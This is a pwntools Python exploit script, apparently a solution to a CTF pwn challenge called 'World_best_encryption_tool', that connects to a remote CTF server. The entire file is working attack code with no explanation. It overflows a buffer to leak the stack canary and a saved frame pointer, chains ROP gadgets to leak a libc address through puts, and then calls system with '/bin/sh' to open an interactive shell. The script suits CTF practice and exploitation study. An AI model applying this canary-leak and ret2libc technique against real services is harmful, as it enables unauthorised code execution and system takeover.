#!/usr/bin/python3

from pwn import *

#p = process("./World_best_encryption_tool")
p = remote("ctf.j0n9hyun.xyz", 3027)
e = ELF("./World_best_encryption_tool")

#context.log_level = 'debug'

sla = lambda t, s: p.sendlineafter(t, s)
pr = 0x004008e3 # pop rdi ; ret
p2r = 0x004008e1 # pop rsi ; pop r15 ; ret
scanf = 0x400913 # %s string for scanf
ret = 0x004005be
stdout = 0x3c5620
binsh = 0x18cd57
system = 0x45390

def send(payload):
    sla(")\n", payload)

def again(s):
    sla("Wanna encrypt other text? (Yes/No)\n", s)

# Leak Canary
payload = "A" * 0x38 + "C"
send(payload)
p.recvuntil("AC")
canary = u64(p.recvn(7).rjust(8, b"\x00"))
log.info("canary: " + hex(canary))
rbp = u64(p.recvn(3).ljust(8, b"\x00"))
log.info("rbp: " + hex(rbp))
again("Yes")

# Leak libc
padding = "A".encode('utf-8') * 0x38 + b"\x00"
padding += "A".encode('utf-8') * (0x78 - len(padding))
padding += p64(canary)
padding += p64(rbp)

payload = padding
payload += p64(pr)
payload += p64(e.bss())
payload += p64(e.plt['puts'])
payload += p64(ret)
payload += p64(ret)
payload += p64(e.sym['main'])
send(payload)
again("No")
libc = u64(p.recvn(6).ljust(8, b"\x00")) - stdout
log.info("libc: " + hex(libc))

# Get shell
payload = padding
payload += p64(pr)
payload += p64(libc + binsh)
payload += p64(libc + system)
payload += p64(ret)
payload += p64(ret)
payload += p64(e.sym['main'])
send(payload)
again("No")

p.interactive()
